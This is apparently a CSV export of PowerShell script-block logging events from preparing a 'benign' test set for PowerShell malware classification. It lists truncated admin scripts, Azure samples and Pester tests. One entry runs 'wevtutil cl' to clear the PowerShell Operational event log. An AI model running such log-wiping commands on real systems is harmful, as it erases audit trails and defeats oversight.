"8/6/2026 9:10:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\2639.ps1","1196","param([string] $ServerInstance); $smosrv = New-Object Microsoft.SqlServer.Management.Smo.Server $ServerInstance; $jobs = @('BackupDBs-FULL','BackupDBs-LOGS'); foreach($job in $jobs){; $j = New-Object "
"8/6/2026 9:10:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:10:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\2622.ps1","1208","Import-Module C:\git-repositories\PowerShell\MSFVMLab\MSFVMLab.psm1 -Force; $LabConfig = Get-Content C:\git-repositories\PowerShell\MSFVMLab\LabVMS.json | ConvertFrom-Json; $WorkingDirectory = $LabCon"
"8/6/2026 9:10:08 AM","","9","$global:?"
"8/6/2026 9:10:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:10:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:10:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:10:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\2600.ps1","984","[System.Reflection.Assembly]::LoadWithPartialName(""Microsoft.SqlServr.Rmo""); $servername = ""STGSQL610""; $repserver = New-Object ""Microsoft.SqlServer.Replication.ReplicationServer""; $srv = New-Object """
"8/6/2026 9:09:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\2569.ps1","1323","$Database = ""dbamaint""; $Server = ""PSQLPA24""; $SMTPServer = ""smtp.domain.com""; $AttachmentPath = ""C:\Dexma\Logs\output.csv""; $SqlQuery = ""exec sel_TRNSizing""; $SqlConnection = New-Object System.Data.S"
"8/6/2026 9:09:51 AM","","9","$global:?"
"8/6/2026 9:09:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\2542.ps1","520","$a = ""XSQLUTIL18"", ""XSQLUTIL19""; $a | % `; {; $ServerName = $_;; cd sqlserver:\; cd sql\$ServerName\default\databases; $DBs = dir;; $DBs | % `; {; $LastBackupDate = $_.LastBackupDate;; $LastLogBackupD"
"8/6/2026 9:09:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\2535.ps1","1166","; $LastDayOfMonth = (Get-Date -Year (Get-Date).Year -Month (Get-Date).Month -Day 1 -DisplayHint Date).AddMonths(1).AddDays(-1); Write-Host ($lastDayOfMonth).Date; $DateDiff1 = New-TimeSpan $(Get-Date "
"8/6/2026 9:09:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\2533.ps1","247","param($fileFilter=$(throw ""Filter must be specified"")); $regex = [regex]""^(?<Program>\S*)\s*pid: (?<PID>\d*)\s*type: (?<Handle>\S*)\s*\w*: (?<File>((\\\\).*|([a-zA-Z]:).*))""; E:\Dexma\bin\ThirdParty\h"
"8/6/2026 9:09:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\2367.ps1","852","$aOutput = @();; $aDisabledGpos = Get-GPO -All | Where-Object { $_.GpoStatus -eq 'AllSettingsDisabled' };; foreach ($oGpo in $aDisabledGpos) {; $oOutput = New-Object System.Object;; $oOutput | Add-Mem"
"8/6/2026 9:09:20 AM","","9","$global:?"
"8/6/2026 9:09:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\2352.ps1","871","Import-Module ActiveDirectory; try {; $uap_docs = Import-Csv C:\scripts\All-Doc-2013-Password-Policy\all-docs-2013-password-policy.csv; $ad_pw_ages = @();; foreach ($user in $uap_docs) {; $ad_pw_ages "
"8/6/2026 9:09:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:09:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:09:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:09:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:09:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\2339.ps1","3191","[xml]$golden_gpo = gc '.\IE Settings.xml'; $gpos = Get-GPOReport -All -ReportType XML; $golden_gpo_computer_registry_settings = ($golden_gpo.GPO.Computer.ExtensionData | ? {$_.Name -eq 'Registry'}).ch"
"8/6/2026 9:09:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\2145.ps1","882","Describe 'Automatic variable $input' -Tags ""CI"" {; It '$input Type should be enumerator' -Skip {; function from_begin { [cmdletbinding()]param() begin { Write-Output -NoEnumerate $input } }; function "
"8/6/2026 9:08:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\2136.ps1","7608","Describe ""Range Operator"" -Tags CI {; Context ""Range integer operations"" {; It ""Range operator generates arrays of integers"" {; $Range = 5..8; $Range.count | Should -Be 4; $Range[0] | Should -BeOfType"
"8/6/2026 9:08:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2125.ps1","1172","Describe ""Test trap"" -Tags ""CI"" {; Context ""Trap with flow control"" {; It ""Line after exception should NOT be continued when it's from a nested script block"" {; $a = . {trap {""trapped""; continue;}; . "
"8/6/2026 9:08:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2110.ps1","4599","Describe ""ArrayExpression Tests"" -Tags ""CI"" {; It ""@([object[]](1,2,3)) should return a 3-element array of object[]"" {; $result = @([object[]](1,2,3)); $result.GetType().FullName | Should -BeExactly """
"8/6/2026 9:08:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2064.ps1","4023","Describe ""Language Primitive Tests"" -Tags ""CI"" {; It ""Equality comparison with string and non-numeric type should not be culture sensitive"" {; $date = [datetime]'2005,3,10'; $val = [System.Management."
"8/6/2026 9:08:24 AM","","9","$global:?"
"8/6/2026 9:08:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:08:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:08:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:08:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:08:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\2051.ps1","3164","try {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = ![System.Management.Automation.Platform]::IsWindowsDesktop; Describe 'Basic COM Tests' -Tags ""CI"""
"8/6/2026 9:08:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\2044.ps1","4607","Describe ""Telemetry for shell startup"" -Tag CI {; BeforeAll {; $cacheDir = [System.Management.Automation.Platform].GetField(""CacheDirectory"",""NonPublic,Static"").GetValue($null); $uuidPath = Join-Path "
"8/6/2026 9:08:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:08:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:08:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:08:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:08:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\2016.ps1","209",". ""$psscriptroot/TestRunner.ps1""; $AssemblyName = ""Microsoft.PowerShell.ConsoleHost""; $excludeList = @(""HostMshSnapinResources.resx""); Test-ResourceStrings -AssemblyName $AssemblyName -ExcludeList $ex"
"8/6/2026 9:08:00 AM","C:\TA\project-ta\data_spliting\test_set\benign\1984.ps1","861","Describe ""New-Event"" -Tags ""CI"" {; Context ""Check return type of New-Event"" {; It ""Should return PSEventArgs as return type of New-Event"" {; New-Event -SourceIdentifier a | Should -BeOfType System.Man"
"8/6/2026 9:07:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\1972.ps1","1664","Describe ""Remove-PSBreakpoint"" -Tags ""CI"" {; $testScript = Join-Path -Path (Join-Path -Path $PSScriptRoot -ChildPath assets) -ChildPath psbreakpointtestscript.ps1; $script = ""`$var = 1; `$var2 = Get-C"
"8/6/2026 9:07:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\1938.ps1","773","Describe ""Measure-Command"" -Tags ""CI"" {; Context ""Validate return types for Measure-Command"" {; It ""Should return TimeSpan as the return type"" {; Measure-Command { Get-Date } | Should -BeOfType timesp"
"8/6/2026 9:07:35 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:07:35 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:07:35 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:07:35 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:07:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\1929.ps1","692","Import-Module HelpersCommon; Describe ""Set-Date for admin"" -Tag @('CI', 'RequireAdminOnWindows', 'RequireSudoOnUnix') {; It ""Set-Date should be able to set the date in an elevated context"" -Skip:(Test"
"8/6/2026 9:07:27 AM","C:\TA\project-ta\data_spliting\test_set\benign\1924.ps1","7608","Describe ""Set-Variable DRT Unit Tests"" -Tags ""CI"" {; It ""Set-Variable normal variable Name should works""{; Set-Variable foo bar; $var1=Get-Variable -Name foo; $var1.Name|Should -BeExactly ""foo""; $var1"
"8/6/2026 9:07:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\1920.ps1","1411","Describe ""Get-Runspace cmdlet tests"" -Tag ""CI"" {; BeforeAll {; $CurrentRunspace = $ExecutionContext.Host.Runspace; $ExpectedInstanceId = $CurrentRunspace.InstanceId; $ExpectedId = $currentRunspace.Id;"
"8/6/2026 9:07:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\1905.ps1","740","Describe ""Get-FormatData"" -Tags ""CI"" {; Context ""Check return type of Get-FormatData"" {; It ""Should return an object[] as the return type"" {; $result = Get-FormatData; ,$result | Should -BeOfType ""Sys"
"8/6/2026 9:07:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\1873.ps1","588","Describe ""New-TemporaryFile"" -Tags ""CI"" {; It ""creates a new temporary file"" {; $tempFile = New-TemporaryFile; $tempFile | Should -Exist; $tempFile | Should -BeOfType System.IO.FileInfo; $tempFile | S"
"8/6/2026 9:06:56 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:56 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:06:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\1870.ps1","2493","Describe ""PSReadLine"" -tags ""CI"" {; BeforeAll {; if (Get-Module PSReadLine) {; $originalEditMode = (Get-PSReadLineOption).EditMode; Remove-Module PSReadLine; }; }; It ""Should import the module correct"
"8/6/2026 9:06:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\1869.ps1","1280","Describe ""Get-PSHostProcessInfo tests"" -Tag CI {; BeforeAll {; $si = [System.Diagnostics.ProcessStartInfo]::new(); $si.FileName = ""pwsh""; $si.Arguments = ""-noexit""; $si.RedirectStandardInput = $true; "
"8/6/2026 9:06:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:06:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:06:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:06:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:06:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\185.ps1","521","; $childWI_ReviewerActivityHasReviewers_Class_id = '6e05d202-38a4-812e-34b8-b11642001a80'; $childWI_ReviewerActivityHasReviewers_Class_obj = Get-SCSMRelationshipClass -id $childWI_ReviewerActivityHasR"
"8/6/2026 9:06:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\1838.ps1","1404","Describe ""Test-Push-Location"" -Tags ""CI"" {; New-Variable -Name startDirectory -Value $(Get-Location).Path -Scope Global -Force; BeforeEach { Set-Location $startDirectory }; It ""Should be called withou"
"8/6/2026 9:06:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\1816.ps1","799","Describe ""Simple ItemProperty Tests"" -Tag ""CI"" {; It ""Can retrieve the PropertyValue with Get-ItemPropertyValue"" {; Get-ItemPropertyValue -path $TESTDRIVE -Name Attributes | Should -Be ""Directory""; };"
"8/6/2026 9:06:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\1799.ps1","1661","Describe ""Clear-EventLog cmdlet tests"" -Tags @('CI', 'RequireAdminOnWindows') {; BeforeAll {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = !$IsWindow"
"8/6/2026 9:06:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\1795.ps1","4729","Describe ""Basic Function Provider Tests"" -Tags ""CI"" {; BeforeAll {; $existingFunction = ""existingFunction""; $nonExistingFunction = ""nonExistingFunction""; $text = ""Hello World!""; $functionValue = { ret"
"8/6/2026 9:05:58 AM","C:\TA\project-ta\data_spliting\test_set\benign\1793.ps1","1997","Describe ""Rename-Item tests"" -Tag ""CI"" {; BeforeAll {; Setup -f originalFile.txt -content ""This is content""; $source = ""$TESTDRIVE/originalFile.txt""; $target = ""$TESTDRIVE/ItemWhichHasBeenRenamed.txt"""
"8/6/2026 9:05:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\1787.ps1","2210","Describe ""Get-PSProvider"" -Tags ""CI"" {; It ""Should be able to call with no parameters without error"" {; { Get-PSProvider } | Should -Not -Throw; }; It ""Should be able to call the filesystem provider"" "
"8/6/2026 9:05:43 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:05:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:05:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:05:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:05:42 AM","C:\TA\project-ta\data_spliting\test_set\benign\1750.ps1","1161","Import-Module $PSScriptRoot/CronTab/CronTab.psd1; Write-Host -Foreground Yellow ""Get the existing cron jobs""; Get-CronJob | Out-Host; Write-Host -Foreground Yellow ""New cron job to clean out tmp every"
"8/6/2026 9:05:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:05:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:05:34 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:05:34 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:05:34 AM","C:\TA\project-ta\data_spliting\test_set\benign\1749.ps1","262","Import-Module Docker; Pull-ContainerImage hello-world; Run-ContainerImage hello-world; cls; Get-Container | Where-Object State -eq ""exited""; Get-Container | Where-Object State -eq ""exited"" | Remove-Co"
"8/6/2026 9:05:26 AM","","9","$global:?"
"8/6/2026 9:05:26 AM","C:\TA\project-ta\data_spliting\test_set\benign\1692.ps1","141","filter notnull {; $props = @(); $obj = $_; $obj | gm -m *property | % { if ( $obj.$($_.name) ) {$props += $_.name} }; $obj | select $props; }"
"8/6/2026 9:05:19 AM","","9","$global:?"
"8/6/2026 9:05:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\1664.ps1","421","function Get-IEVersion ($computer = $env:COMPUTERNAME) {; $version = 0; $keyname = 'SOFTWARE\Microsoft\Internet Explorer'; $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $comp"
"8/6/2026 9:05:11 AM","","9","$global:?"
"8/6/2026 9:05:11 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:05:11 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:05:11 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:05:11 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:05:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\1615.ps1","210","$Dest = ""C:\Support\SQLBac\"";; $Daysback = ""0"";; $CurrentDate = Get-Date; $DatetoDelete = $CurrentDate.AddDays($Daysback); Get-ChildItem $Dest | Where-Object { $_.LastWriteTime -lt $DatetoDelete } | R"
"8/6/2026 9:05:03 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:05:03 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:05:03 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:05:03 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:05:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\1589.ps1","343","$folders = @('C:\Windows\Temp\*', 'C:\Documents and Settings\*\Local Settings\temp\*', 'C:\Users\*\Appdata\Local\Temp\*', 'C:\Users\*\Appdata\Local\Microsoft\Windows\Temporary Internet Files\*', 'C:\W"
"8/6/2026 9:04:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:04:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:04:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:04:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:04:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\1219.ps1","621","& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve); $manifest = Test-ModuleManifest -Path (Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon\Carbon.psd1' -Resolve); De"
"8/6/2026 9:04:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/6/2026 9:04:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:04:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:04:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:04:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:04:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\1034.ps1","318","Set-StrictMode -Version Latest; & (Join-Path $PSScriptRoot Carbon\Import-Carbon.ps1 -Resolve); $websitePath = Join-Path $PSScriptRoot Website -Resolve; Install-IisWebsite -Name 'get-carbon.org' -Path "
"8/6/2026 9:04:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:04:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:04:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:04:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:04:25 AM","","9","$global:?"
"8/6/2026 9:04:25 AM","","29","Write-Host 'Final result: 1';"
"8/6/2026 9:04:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\1015.ps1","1007","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:04:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\1012.ps1","1310","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:03:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\1008.ps1","430","$myTopic = ""<your-custom-topic-name>""; $myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; New-AzResourceGroup -Name $myResourceGroup -Location westus2; New-AzEventGridTop"
"8/6/2026 9:03:50 AM","C:\TA\project-ta\data_spliting\test_set\benign\1006.ps1","317","$myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; $resourceGroupID = (New-AzResourceGroup -Name $myResourceGroup -Location westus2).ResourceId; New-AzEventGridSubscripti"
"8/6/2026 9:03:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:03:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:03:42 AM","C:\TA\project-ta\data_spliting\test_set\benign\1001.ps1","193","$myEndpoint = ""<your-endpoint-URL>""; Set-AzContext -Subscription ""<subscription-name-or-ID>""; New-AzEventGridSubscription -Endpoint $myEndpoint -EventSubscriptionName demoSubscriptionToAzureSub"
"8/6/2026 9:03:42 AM","","9",".\uji.ps1"
"8/6/2026 9:01:56 AM","","6","prompt"
"8/6/2026 9:01:56 AM","","54","wevtutil cl ""Microsoft-Windows-PowerShell/Operational"""
